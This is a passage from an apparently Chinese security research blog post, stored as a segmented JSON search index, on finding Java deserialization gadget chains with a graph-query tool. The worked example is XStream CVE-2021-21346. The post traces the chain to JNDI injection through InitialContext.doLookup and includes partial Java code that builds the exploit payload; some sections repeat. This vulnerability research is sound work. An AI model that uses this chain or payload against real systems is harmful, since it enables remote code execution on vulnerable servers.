\u770b\u5230 \u672b\u7aef \u7684 \u5371\u9669 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u70b9\u4e3a   sun . swing . SwingLazyValue # createValue   \uff0c \u6765\u770b \u4e00\u4e0b \u5177\u4f53 \u7684 \u4ee3\u7801   public   Object   createValue   (   final   UIDefaults   table   )   {   try   {   ReflectUtil   .   checkPackageAccess   (   className   ) ;   Class   < ? >   c   =   Class   .   forName   (   className   ,   true   ,   null   ) ;   if   (   methodName   ! =   null   )   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Method   m   =   c   .   getMethod   (   methodName   ,   types   ) ;   makeAccessible   (   m   ) ;   return   m   .   invoke   (   c   ,   args   ) ;   }   else   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Constructor   constructor   =   c   .   getConstructor   (   types   ) ;   makeAccessible   (   constructor   ) ;   return   constructor   .   newInstance   (   args   ) ;   }   }   catch   (   Exception   e   )   {   / /   Ideally   we   would   throw   an   exception ,   unfortunately   / /   often   times   there   are   errors   as   an   initial   look   and   / /   feel   is   loaded   before   one   can   be   switched .   Perhaps   a   / /   flag   should   be   added   for   debugging ,   so   that   if   true   / /   the   exception   would   be   thrown .   }   return   null   ;   }   \u4ece \u4ee3\u7801 \u4e0a \u770b \uff0c \u8be5 \u51fd\u6570 \u53ef\u4ee5 \u8c03\u7528 \u4efb\u610f \u7684 \u9759\u6001 \u51fd\u6570 \u6216 \u4efb\u610f \u5bf9\u8c61 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u3002 \u90a3\u4e48 \u6211\u4eec \u5c31 \u5148 \u786e\u5b9a \u5f53\u524d \u8fd9\u4e2a \u51fd\u6570 \u662f\u5426 \u662f\u5426\u662f \u53ef\u7528 \u7684 \uff0c \u5373 \u627e\u5230 \u5408\u9002 \u7684 \u9759\u6001 \u51fd\u6570 \u6216 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u4f1a \u8c03\u7528 \u67d0\u4e9b \u5371\u9669 \u51fd\u6570 \u4ece\u800c \u8fbe\u6210 \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u6216 \u547d\u4ee4 \u6267\u884c \u3002 \u8fd9\u91cc \u4e5f \u540c\u6837 \u6784\u9020 \u56fe \u67e5\u8be2 \u8bed\u53e5 \u8fdb\u884c \u5408\u9002 \u51fd\u6570 \u7684 \u67e5\u627e \uff0c \u6682\u65f6 \u9650\u5b9a \u5371\u9669 \u51fd\u6570 \u4e3a   exec   \u3001   lookup   \u3001   invoke   \u3002   \u627e\u5230 \u4e86 \u4e00\u4e2a \u53ef\u4ee5 \u7528 \u7684 \u51fd\u6570   < javax . naming . InitialContext :   java . lang . Object   doLookup ( java . lang . String ) >   \uff0c \u8be5 \u9759\u6001 \u51fd\u6570 \u53ef\u4ee5 \u8fdb\u884c JNDI \u6ce8\u5165 \u653b\u51fb \u3002   \u6240\u4ee5 \u5230 \u8fd9\u91cc \u6211\u4eec \u5c31 \u80fd \u786e\u5b9a \u5f53\u524d \u7684   sun . swing . SwingLazyValue # createValue   \u662f \u53ef\u4ee5 \u5229\u7528 \u7684 \u8282\u70b9 \u3002   \u90a3\u4e48 \u6839\u636e \u524d \u4e00\u4e2a \u67e5\u8be2 \u7ed3\u679c \uff0c \u6211\u4eec \u7ee7\u7eed \u8fdb\u884c \u5206\u6790   javax . swing . UIDefaults # getFromHashtable   \u3002   private   Object   getFromHashtable   (   final   Object   key   )   {   / *   Quickly   handle   the   common   case ,   without   grabbing   *   a   lock .   * /   Object   value   =   super   .   get   (   key   ) ;   / /   ...   / *   At   this   point   we   know   that   the   value   of   key   was   *   a   LazyValue   or   an   ActiveValue .   * /   if   (   value   instanceof   LazyValue   )   {   try   {   / *   If   an   exception   is   thrown   we ' ll   just   put   the   LazyValue   *   back   in   the   table .   * /   value   =   ( (   LazyValue   )   value   ) .   createValue   (   this   ) ;   }   / /   ...   }   javax . swing . UIDefaults   \u662f   Hashtable < Object , Object >   \u7684 \u53e6 \u4e00\u4e2a \u5b9e\u73b0 \uff0c \u6240\u4ee5 \u8fd9\u91cc   super . get ( key )   \u83b7\u53d6 \u5230 \u7684 value \u503c \u5bf9\u4e8e \u6211\u4eec \u6765\u8bf4 \u662f \u53ef\u4ee5 \u4efb\u610f \u586b\u5145 \u7684 \uff0c \u90a3\u4e48 \u6b64\u5904 \u586b\u5145 \u524d\u9762 \u7684   sun . swing . SwingLazyValue   \u5bf9\u8c61 \u5373\u53ef \u89e6\u53d1   createValue   \u51fd\u6570 \u7684 \u8c03\u7528 \u3002   \u4ece   getFromHashtable   \u51fd\u6570 \u5f00\u59cb \uff0c \u8c03\u7528 \u5bf9\u8c61 \u7684 \u60c5\u51b5 \u5f00\u59cb \u53d8\u591a \u4e86 \u8d77\u6765 \uff0c \u6b64\u65f6 \u9700\u8981 \u5bf9 \u6bcf \u4e00\u6761 \u8fdb\u884c \u5206\u522b \u5206\u6790 \uff0c \u4f46 \u591a\u6570 \u60c5\u51b5 \u7b80\u5355 \u770b \u4e00\u4e0b \u5c31 \u80fd \u786e\u5b9a \u5f53\u524d \u7684 \u4f20\u9012 \u60c5\u51b5 \u662f\u5426 \u53ef \u5ef6\u7eed \u3002   \u6b64\u5904 \uff0c \u6211 \u5c31 \u76f4\u63a5 \u8bb2 CVE - 2021 - 21346 \u7684 \u5229\u7528 \u94fe \u3002   javax . swing . UIDefaults # get   \u51fd\u6570   public   Object   get   (   Object   key   )   {   Object   value   =   getFromHashtable   (   key   ) ;   return   (   value   ! =   null   )   ?   value   :   getFromResourceBundle   (   key   ,   null   ) ;   }   get   \u51fd\u6570 \u5ef6\u7eed \u4e86 key \u7684 \u4f20\u9012 \uff0c \u7ee7\u7eed \u5f80 \u4e0a \u5206\u6790   javax . swing . MultiUIDefaults # get   \u51fd\u6570   public   Object   get   (   Object   key   )   {   Object   value   =   super   .   get   (   key   ) ;   if   (   value   ! =   null   )   {   return   value   ;   }   for   (   UIDefaults   table   :   tables   )   {   value   =   (   table   ! =   null   )   ?   table   .   get   (   key   )   :   null   ;   if   (   value   ! =   null   )   {   return   value   ;   }   }   return   null   ;   }   \u8be5 \u51fd\u6570 \u6709 \u4e24\u5904 \u5730\u65b9 \u8c03\u7528 \u4e86   javax . swing . UIDefaults # get   \u5206\u522b \u662f \u7b2c 3 \u884c \u3001 \u7b2c 9 \u884c \uff0c \u6240\u4ee5 \u5728 \u5199 poc \u7684 \u65f6\u5019 \uff0c \u53ef\u4ee5 \u76f4\u63a5 \u66ff\u6362 \u7c7b \u5c5e\u6027 tables \u6216 hashtable \u672c\u8eab \u7684 value \u503c \u4e5f \u53ef\u4ee5 \u3002   \u7ee7\u7eed \u5411\u4e0a \uff0c   javax . swing . MultiUIDefaults # toString   public   synchronized   String   toString   ( )   {   StringBuffer   buf   =   new   StringBuffer   ( ) ;   buf   .   append   (   \" { \"   ) ;   Enumeration   keys   =   keys   ( ) ;   while   (   keys   .   hasMoreElements   ( ) )   {   Object   key   =   keys   .   nextElement   ( ) ;   buf   .   append   (   key   +   \" = \"   +   get   (   key   )   +   \" ,   \"   ) ;   }   int   length   =   buf   .   length   ( ) ;   if   (   length   >   1   )   {   buf   .   delete   (   length   -   2   ,   length   ) ;   }   buf   .   append   (   \" } \"   ) ;   return   buf   .   toString   ( ) ;   }   toString \u51fd\u6570 \u904d\u5386 \u4e86 \u5f53\u524d hashtable \u6240 \u5b58\u50a8 \u7684 \u5185\u5bb9 \uff0c \u81ea\u7136 \u8fd9\u91cc \u4e5f \u5c31 \u8c03\u7528 \u5230 \u4e86   javax . swing . MultiUIDefaults # get   \u51fd\u6570 \uff08 \u7b2c 7 \u884c \uff09 \u3002   \u6240\u4ee5 \u6b64\u4e3a \u4e3a\u6b62 \u5230\u6b64\u4e3a\u6b62 \uff0c \u6211\u4eec \u6709 \u4ece toString \u51fd\u6570 \u5230 invoke \u51fd\u6570 \u7684 \u8c03\u7528 \u94fe \u4e86 \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u627e\u5230 \u89e6\u53d1 \u51fd\u6570 \u5230 toString \u51fd\u6570 \u7684 \u8c03\u7528 \u94fe \u4e86 \uff0c \u8fd9\u91cc \u4e3a\u4e86 \u67e5\u8be2 \u7ed3\u679c \u66f4\u4e3a \u6e05\u6670 \uff0c \u6211\u4eec \u53ea \u67e5\u8be2 \u4ece \u89e6\u53d1 \u51fd\u6570 \u5230 toString \u51fd\u6570 \u7684 \u5229\u7528 \u94fe \u60c5\u51b5 \u3002   match   ( source : Method )   where   source . NAME   in   [ \" compareTo \" ]   match   ( sink : Method   { NAME : \" toString \" } ) < - [ r : CALL ] - ( m1 : Method )   where   r . REAL _ CALL _ TYPE   in   [ \" java . lang . Object \" ]   call   apoc . algo . allSimplePaths ( m1 ,   source ,   \" < CALL | ALIAS \" ,   6 )   yield   path   return   *   limit   20   \u8fd9\u91cc \u6bd4\u8f83 \u96be\u53d7 \u7684 \u662f \u4e09\u4e2a \u89e6\u53d1 \u51fd\u6570 \u548c toString \u51fd\u6570 \u90fd \u662f \u6709 \u5927\u91cf \u5b9e\u73b0 \u7684 \u51fd\u6570 \uff0c \u6240\u4ee5 \u5982\u679c \u8981 \u627e\u5230 \u4e00\u6761 \u53ef\u7528 \u7684 \u5f97 \u770b \u4e0d\u5c11 \u65f6\u95f4 \u3002 \u4e0b\u56fe \u7b80\u5355 \u5904\u7406 \u4e86 \u4e00\u4e0b \uff08 \u56fe\u4e2d\u753b \u7684 \u7bad\u5934 \u53ea\u662f \u4e00\u79cd \u53ef\u80fd \u53ef\u80fd\u6027 \uff09   \u6b64\u5904 \u6211\u4eec \u4ece compareTo \u5f00\u59cb \u8bb2 \uff0c   javax . naming . ldap . Rdn $ RdnEntry # compareTo   public   int   compareTo   (   RdnEntry   that   )   {   int   diff   =   type   .   compareToIgnoreCase   (   that   .   type   ) ;   if   (   diff   ! =   0   )   {   return   diff   ;   }   if   (   value   .   equals   (   that   .   value   ) )   {   / /   try   shortcut   return   0   ;   }   return   getValueComparable   ( ) .   compareTo   (   that   .   getValueComparable   ( ) ) ;   }   \u8fd9\u91cc \u7684 \u7c7b \u5c5e\u6027 value \u53d1\u8d77 \u4e86 equals \u51fd\u6570 \uff0c \u5f80\u4e0b \u770b   com . sun . org . apache . xpath . internal . objects . XString # equals   public   boolean   equals   (   Object   obj2   )   {   if   (   null   = =   obj2   )   return   false   ;   / /   In   order   to   handle   the   ' all '   semantics   of   / /   nodeset   comparisons ,   we   always   call   the   / /   nodeset   function .   else   if   (   obj2   instanceof   XNodeSet   )   return   obj2   .   equals   (   this   ) ;   else   if   (   obj2   instanceof   XNumber   )   return   obj2   .   equals   (   this   ) ;   else   return   str   ( ) .   equals   (   obj2   .   toString   ( ) ) ;   }   \u8fd9\u91cc \u76f4\u63a5 \u8c03\u7528 \u4e86 obj2 \u7684 toString \u51fd\u6570 \uff0c \u6240\u4ee5 \u8fde \u4e0a \u524d\u9762 \u7684 \u5229\u7528 \u94fe \u5b8c\u6574 \u7684 \u5229\u7528 \u94fe \u5c31 \u51fa\u6765 \u4e86   javax . naming . ldap . Rdn $ RdnEntry . compareTo   com . sun . org . apache . xpath . internal . objects . XString . equal   javax . swing . MultiUIDefaults . toString   UIDefaults . get   UIDefaults . getFromHashTable   UIDefaults $ LazyValue . createValue   SwingLazyValue . createValue   javax . naming . InitialContext . doLookup ( )   \u81f3\u6b64 \uff0c CVE - 2021 - 21346 \u5c31 \u6316\u51fa \u51fa\u6765 \u6316\u51fa\u6765 \u4e86 \uff0c \u76f8\u5bf9 \u4e8e \u4eba\u5de5 \u6316 \uff0c \u5f53\u524d \u7684 \u65b9\u6cd5 \u5927\u5e45 \u5e45\u5ea6 \u5927\u5e45\u5ea6 \u51cf\u5c11 \u4e86 \u5229\u7528 \u94fe \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \u79cd\u7c7b \uff0c \u540c\u6837 \uff0c \u53e6 \u4e00\u6761 CVE - 2021 - 21351 \u4e5f \u662f \u540c\u6837 \u7684 \u65b9\u6cd5 \u53ef\u4ee5 \u53d1\u73b0 \uff0c \u4ee5\u540e \u6709\u7a7a \u518d \u8865\u5145 \u4e9b \u5176\u4ed6 \u7684 \u6848\u4f8b : )   # 3   \u5229\u7528 \u94fe \u6784\u9020   \u5f53\u524d \u8fd9 \u6761 \u5229\u7528 \u94fe \u7684 \u6784\u9020 \u76f8\u5bf9 \u6765\u8bf4 \u76f8\u5bf9\u6765\u8bf4 \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \uff0c \u53ea \u9700\u8981 \u6784\u9020 \u597d MultiUIDefaults \u5373\u53ef \uff0c \u4e0b\u9762 \u4e3a \u90e8\u5206 \u6784\u9020 \u4ee3\u7801 \uff0c \u8be6\u7ec6 \u89c1   LazyValue   UIDefaults   uiDefaults   =   new   UIDefaults   ( ) ;   Object   multiUIDefaults   =   ReflectionHelper   .   newInstance   (   \" javax . swing . MultiUIDefaults \"   ,   new   Object   [ ]   {   new   UIDefaults   [ ]   {   uiDefaults   } } ) ;   uiDefaults   .   put   (   \" lazyValue \"   ,   obj   ) ;   Object   rdnEntry1   =   ReflectionHelper   .   newInstance   (   \" javax . naming . ldap . Rdn $ RdnEntry \"   ,   null   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry1   ,   \" type \"   ,   \" ysomap \"   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry1   ,   \" value \"   ,   new   XString   (   \" test \"   ) ) ;   Object   rdnEntry2   =   ReflectionHelper   .   newInstance   (   \" javax . naming . ldap . Rdn $ RdnEntry \"   ,   null   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry2   ,   \" type \"   ,   \" ysomap \"   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry2   ,   \" value \"   ,   multiUIDefaults   ) ;   return   PayloadHelper   .   makeTreeSet   (   rdnEntry2   ,   rdnEntry1   ) ;   # 4   \u603b\u7ed3   13 \u53f7 \u7684 \u65f6\u5019 XStream \u53d1\u5e03 \u4e86 1.4 . 16 \uff0c \u5171 \u4fee\u590d \u4e86 11 \u4e2a CVE \uff0c \u5176\u4e2d \u8fd8 \u6bd4\u8f83 \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u662f threedr3am \u7684 classloader \u7684 \u5229\u7528 \u65b9\u5f0f \uff0c \u4ee5\u53ca \u949f\u6f66\u8d35 \u5e08\u5085 \u7684 CVE - 2021 - 21345 \uff08 \u8fd9 \u6761 \u5229\u7528 \u94fe \u5f88\u957f \uff0c \u6211 \u5f53\u524d \u53ea\u7528 tabby \u505a \u4e86 12 \u4e2a \u8282\u70b9 \u7684 \u67e5\u627e \uff0c \u8fd9\u6761 \u94fe \u5927\u6982 \u6709 20 \u4e2a \u8282\u70b9 \uff0c \u55ef \uff0c \u5f88\u957f \uff09 \u3002 \u76f8\u4fe1 \u8fd9\u6ce2 \u5b8c \u4e86 \u4e4b\u540e \uff0c \u4f30\u8ba1 \u8fd8 \u80fd \u627e\u5230 \u4e00\u4e9b \u6f0f\u7f51 \u6f0f\u7f51\u4e4b\u9c7c XD","title":"\u5982\u4f55 \u9ad8\u6548 \u7684 \u6316\u6398 Java \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff1f"},{"location":"blog/2021/how_to_find_gadget_chains/#1","text":"Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u4e00\u76f4 \u90fd \u662f \u56fd\u5185 \u5185\u5916 \u56fd\u5185\u5916 \u7814\u7a76 \u70ed\u70b9 \u4e4b\u4e00 \uff0c \u4f46 \u5f53\u524d \u81ea\u52a8 \u81ea\u52a8\u5316 \u65b9\u6848 gadgetinspector \u7684 \u6548\u679c \u5e76 \u4e0d\u597d \u3002 \u6240\u4ee5 \u76ee\u524d \u591a\u6570 \u5e08\u5085 \u4ecd\u7136 \u662f \u4ee5 \u4eba\u5de5 + \u81ea\u7814 \u5c0f \u5de5\u5177 \u7684 \u65b9\u5f0f \u8fdb\u884c \u5229\u7528 \u94fe \u7684 \u6316\u6398 \u3002 \u76ee\u524d \u6211 \u4e2a\u4eba \u4e5f \u5728 \u627e \u4e00\u4e2a \u5408\u9002 \u7684 \u65b9\u6cd5 \u6765 \u9ad8\u6548 \u6316\u6398 \u5229\u7528 \u94fe \uff0c \u672c\u6587 \u5c06 \u4e3b\u8981 \u4ecb\u7ecd \u6211 \u81ea\u5df1 \u7684 \u4e00\u4e9b \u6316\u6398 \u5fc3\u5f97 \uff0c \u8f85\u4ee5 XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe CVE - 2021 - 21346 \u4e3a\u4f8b \u3002","title":"# 1   \u524d\u8a00"},{"location":"blog/2021/how_to_find_gadget_chains/#1_1","text":"\u8fd9\u91cc \u524d\u7f6e \u77e5\u8bc6 \u4e3b\u8981 \u6709 \u4e24\u7c7b \uff1a XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u539f\u7406 \u548c \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5   XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u539f\u7406   \u8fd9\u91cc \u5177\u4f53 \u7684 \u539f\u7406 \u53ef\u4ee5 \u89c1   \u56de\u987e XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \uff0c \u8fd9\u91cc \u6211\u4eec \u53ea \u9700 \u77e5\u9053 XStream \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \u4e2d \u5b83 \u7684 \u9650\u5236 \u662f \u5f88\u5c11 \u7684 \uff08 \u4e0d\u7528 PureJavaReflectionProvider \uff09 \uff0c \u5b83 \u751a\u81f3 \u80fd \u8fd8\u539f \u6784\u9020 \u597d \u7684 Method \u5bf9\u8c61 \u3002 \u6240\u4ee5 \u8fd9\u91cc \u6211\u4eec \u9700\u8981 \u6e05\u695a \u7684 \u662f \u5b83 \u7684 \u89e6\u53d1 \u51fd\u6570 source \u662f \u4ec0\u4e48 \uff0c \u770b \u6211 \u4e0a\u9762 \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u80fd \u77e5\u9053 \u5171\u6709 hashCode \u51fd\u6570 \uff08 Map \u65b9\u5f0f \uff09 \u3001 compareTo \u51fd\u6570 \uff08 TreeSet \u65b9\u5f0f \uff09 \u3001 compare \u51fd\u6570 \uff08 PriorityQueue \u65b9\u5f0f \uff09 \u3002   \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5   \u8fd9\u91cc \u7528\u5230 \u4e86 \u6211 \u5373\u5c06 \u5f00\u6e90 \u7684 \u5de5\u5177   tabby   \uff0c \u8be5 \u5de5\u5177 \u5c06 jar \u6587\u4ef6 \u8f6c\u5316 \u4e3a \u4ee3\u7801 \u5c5e\u6027 \u56fe \uff0c \u7136\u540e \u540e\u7eed \u6211\u4eec \u53ef\u4ee5 \u7528 neo4j \u7684 \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5 \u8fdb\u884c \u5229\u7528 \u94fe \u7684 \u67e5\u627e \uff0c \u6240\u4ee5 \u6211\u4eec \u9700\u8981 \u6709 \u4e00\u5b9a \u7684 \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5 \u7684   \u57fa\u7840","title":"# 1   \u524d\u7f6e \u77e5\u8bc6"},{"location":"blog/2021/how_to_find_gadget_chains/#2","text":"\u9996\u5148 \u672c\u6b21 \u9488\u5bf9 \u7684 \u662f JDK \u76f8\u5173 Jar \u6587\u4ef6 \u7684 \u5229\u7528 \u94fe \u68c0\u6d4b \u5206\u6790 \uff0c \u6240\u4ee5 \u5148 \u4f7f\u7528 tabby \u751f\u6210 JDK \u76f8\u5173 \u7684 \u4ee3\u7801 \u5c5e\u6027 \u56fe\u81f3 \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u3002 \u6267\u884c \u5b8c \u4ee5\u4e0b \u4e24\u53e5 \u547d\u4ee4 \uff0c \u53ef\u4ee5 \u751f\u6210 \u4e00\u4e2a 28w \u6570\u636e \u8282\u70b9 \uff0c 76w \u5173\u7cfb \u8fb9 \u7684 \u4ee3\u7801 \u5c5e\u6027 \u56fe \uff1a   #   \u751f\u6210 \u56fe \u7f13\u5b58 \u6587\u4ef6   java   - Xmx6g   - jar   target / tabby - 1.0 . 0 - SNAPSHOT . jar   -- isJDKOnly   #   \u5bfc\u5165 Neo4j \u56fe \u6570\u636e   java   - Xmx6g   - jar   target / tabby - 1.0 . 0 - SNAPSHOT . jar   -- isSaveOnly   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u6784\u9020 \u56fe \u67e5\u8be2 \u8bed\u8a00 \u67e5\u8be2\u8bed\u8a00 \uff0c \u8fd9\u91cc \u63d0\u4f9b \u4e00\u4e2a \u6a21\u7248   match   (   source   :   Method   )   / /   \u6dfb\u52a0   where \u8bed\u53e5 \u9650\u5236 source \u51fd\u6570   match   (   sink   :   Method   {   IS _ SINK   :   true   }   )   / /   \u6dfb\u52a0   where \u8bed\u53e5 \u9650\u5236 sink \u51fd\u6570   call   apoc   .   algo   .   allSimplePaths   (   m1   ,   source   ,   \" < CALL | ALIAS \"   ,   12   )   yield   path   / /   \u67e5\u627e \u5177\u4f53 \u8def\u5f84   ,   12   \u4ee3\u8868 \u6df1\u5ea6 \uff0c \u53ef\u4ee5 \u4fee\u6539   return   *   limit   20   \u5f53\u524d \u6211\u4eec \u5df2\u7ecf \u786e\u5b9a \u4e86 \u5f53\u524d \u53ef\u4ee5 \u4f7f\u7528 hashCode \u51fd\u6570 \u3001 compareTo \u51fd\u6570 \u3001 compare \u51fd\u6570 \u4f5c\u4e3a source \u51fd\u6570 \uff0c \u90a3\u4e48 \u53ea\u8981 \u518d \u9650\u5236 sink \u51fd\u6570 \u5373\u53ef \uff0c \u5982\u4e0b \u67e5\u8be2 \u8bed\u53e5   match   ( source : Method   { NAME : \" compare \" } )   match   ( sink : Method   { IS _ SINK : true ,   NAME : \" invoke \" } ) < - [ : CALL ] - ( m1 : Method )   call   apoc . algo . allSimplePaths ( m1 ,   source ,   \" < CALL | ALIAS \" ,   12 )   yield   path   return   *   limit   20   \u672c\u6b21 \u5229\u7528 \u94fe \u5c06 \u9650\u5236 \u5371\u9669 \u51fd\u6570 \u4e3a Method . invoke \u51fd\u6570 \uff0c \u5177\u4f53 \u67e5\u8be2 \u7ed3\u679c \u5982\u4e0b \u56fe \u6240\u793a   \u53ef\u4ee5 \u770b\u5230 \u672b\u7aef \u7684 \u5371\u9669 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u70b9\u4e3a   sun . swing . SwingLazyValue # createValue   \uff0c \u6765\u770b \u4e00\u4e0b \u5177\u4f53 \u7684 \u4ee3\u7801   public   Object   createValue   (   final   UIDefaults   table   )   {   try   {   ReflectUtil   .   checkPackageAccess   (   className   ) ;   Class   < ? >   c   =   Class   .   forName   (   className   ,   true   ,   null   ) ;   if   (   methodName   ! =   null   )   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Method   m   =   c   .   getMethod   (   methodName   ,   types   ) ;   makeAccessible   (   m   ) ;   return   m   .   invoke   (   c   ,   args   ) ;   }   else   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Constructor   constructor   =   c   .   getConstructor   (   types   ) ;   makeAccessible   (   constructor   ) ;   return   constructor   .   newInstance   (   args   ) ;   }   }   catch   (   Exception   e   )   {   / /   Ideally   we   would   throw   an   exception ,   unfortunately   / /   often   times   there   are   errors   as   an   initial   look   and   / /   feel   is   loaded   before   one   can   be   switched .   Perhaps   a   / /   flag   should   be   added   for   debugging ,   so   that   if   true   / /   the   exception   would   be   thrown .   }   return   null   ;   }   \u4ece \u4ee3\u7801 \u4e0a \u770b \uff0c \u8be5 \u51fd\u6570 \u53ef\u4ee5 \u8c03\u7528 \u4efb\u610f \u7684 \u9759\u6001 \u51fd\u6570 \u6216 \u4efb\u610f \u5bf9\u8c61 \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u3002 \u90a3\u4e48 \u6211\u4eec \u5c31 \u5148 \u786e\u5b9a \u5f53\u524d \u8fd9\u4e2a \u51fd\u6570 \u662f\u5426 \u662f\u5426\u662f \u53ef\u7528 \u7684 \uff0c \u5373 \u627e\u5230 \u5408\u9002 \u7684 \u9759\u6001 \u51fd\u6570 \u6216 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u4f1a \u8c03\u7528 \u67d0\u4e9b \u5371\u9669 \u51fd\u6570 \u4ece\u800c \u8fbe\u6210 \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u6216 \u547d\u4ee4 \u6267\u884c \u3002 \u8fd9\u91cc \u4e5f \u540c\u6837 \u6784\u9020 \u56fe \u67e5\u8be2 \u8bed\u53e5 \u8fdb\u884c \u5408\u9002 \u51fd\u6570 \u7684 \u67e5\u627e \uff0c \u6682\u65f6 \u9650\u5b9a \u5371\u9669 \u51fd\u6570 \u4e3a   exec   \u3001   lookup   \u3001   invoke   \u3002   \u627e\u5230 \u4e86 \u4e00\u4e2a \u53ef\u4ee5 \u7528 \u7684 \u51fd\u6570   < javax . naming . InitialContext :   java . lang . Object   doLookup ( java . lang . String ) >   \uff0c \u8be5 \u9759\u6001 \u51fd\u6570 \u53ef\u4ee5 \u8fdb\u884c JNDI \u6ce8\u5165 \u653b\u51fb \u3002   \u6240\u4ee5 \u5230 \u8fd9\u91cc \u6211\u4eec \u5c31 \u80fd \u786e\u5b9a \u5f53\u524d \u7684   sun . swing . SwingLazyValue # createValue   \u662f \u53ef\u4ee5 \u5229\u7528 \u7684 \u8282\u70b9 \u3002   \u90a3\u4e48 \u6839\u636e \u524d \u4e00\u4e2a \u67e5\u8be2 \u7ed3\u679c \uff0c \u6211\u4eec \u7ee7\u7eed \u8fdb\u884c \u5206\u6790   javax . swing . UIDefaults # getFromHashtable   \u3002   private   Object   getFromHashtable   (   final   Object   key   )   {   / *   Quickly   handle   the   common   case ,   without   grabbing   *   a   lock .   * /   Object   value   =   super   .   get   (   key   ) ;   / /   ...   / *   At   this   point   we   know   that   the   value   of   key   was   *   a   LazyValue   or   an   ActiveValue .   * /   if   (   value   instanceof   LazyValue   )   {   try   {   / *   If   an   exception   is   thrown   we ' ll   just   put   the   LazyValue   *   back   in   the   table .   * /   value   =   ( (   LazyValue   )   value   ) .   createValue   (   this   ) ;   }   / /   ...   }   javax . swing . UIDefaults   \u662f   Hashtable < Object , Object >   \u7684 \u53e6 \u4e00\u4e2a \u5b9e\u73b0 \uff0c \u6240\u4ee5 \u8fd9\u91cc   super . get ( key )   \u83b7\u53d6 \u5230 \u7684 value \u503c \u5bf9\u4e8e \u6211\u4eec \u6765\u8bf4 \u662f \u53ef\u4ee5 \u4efb\u610f \u586b\u5145 \u7684 \uff0c \u90a3\u4e48 \u6b64\u5904 \u586b\u5145 \u524d\u9762 \u7684   sun . swing . SwingLazyValue   \u5bf9\u8c61 \u5373\u53ef \u89e6\u53d1   createValue   \u51fd\u6570 \u7684 \u8c03\u7528 \u3002   \u4ece   getFromHashtable   \u51fd\u6570 \u5f00\u59cb \uff0c \u8c03\u7528 \u5bf9\u8c61 \u7684 \u60c5\u51b5 \u5f00\u59cb \u53d8\u591a \u4e86 \u8d77\u6765 \uff0c \u6b64\u65f6 \u9700\u8981 \u5bf9 \u6bcf \u4e00\u6761 \u8fdb\u884c \u5206\u522b \u5206\u6790 \uff0c \u4f46 \u591a\u6570 \u60c5\u51b5 \u7b80\u5355 \u770b \u4e00\u4e0b \u5c31 \u80fd \u786e\u5b9a \u5f53\u524d \u7684 \u4f20\u9012 \u60c5\u51b5 \u662f\u5426 \u53ef \u5ef6\u7eed \u3002   \u6b64\u5904 \uff0c \u6211 \u5c31 \u76f4\u63a5 \u8bb2 CVE - 2021 - 21346 \u7684 \u5229\u7528 \u94fe \u3002   javax . swing . UIDefaults # get   \u51fd\u6570   public   Object   get   (   Object   key   )   {   Object   value   =   getFromHashtable   (   key   ) ;   return   (   value   ! =   null   )   ?   value   :   getFromResourceBundle   (   key   ,   null   ) ;   }   get   \u51fd\u6570 \u5ef6\u7eed \u4e86 key \u7684 \u4f20\u9012 \uff0c \u7ee7\u7eed \u5f80 \u4e0a \u5206\u6790   javax . swing . MultiUIDefaults # get   \u51fd\u6570   public   Object   get   (   Object   key   )   {   Object   value   =   super   .   get   (   key   ) ;   if   (   value   ! =   null   )   {   return   value   ;   }   for   (   UIDefaults   table   :   tables   )   {   value   =   (   table   ! =   null   )   ?   table   .   get   (   key   )   :   null   ;   if   (   value   ! =   null   )   {   return   value   ;   }   }   return   null   ;   }   \u8be5 \u51fd\u6570 \u6709 \u4e24\u5904 \u5730\u65b9 \u8c03\u7528 \u4e86   javax . swing . UIDefaults # get   \u5206\u522b \u662f \u7b2c 3 \u884c \u3001 \u7b2c 9 \u884c \uff0c \u6240\u4ee5 \u5728 \u5199 poc \u7684 \u65f6\u5019 \uff0c \u53ef\u4ee5 \u76f4\u63a5 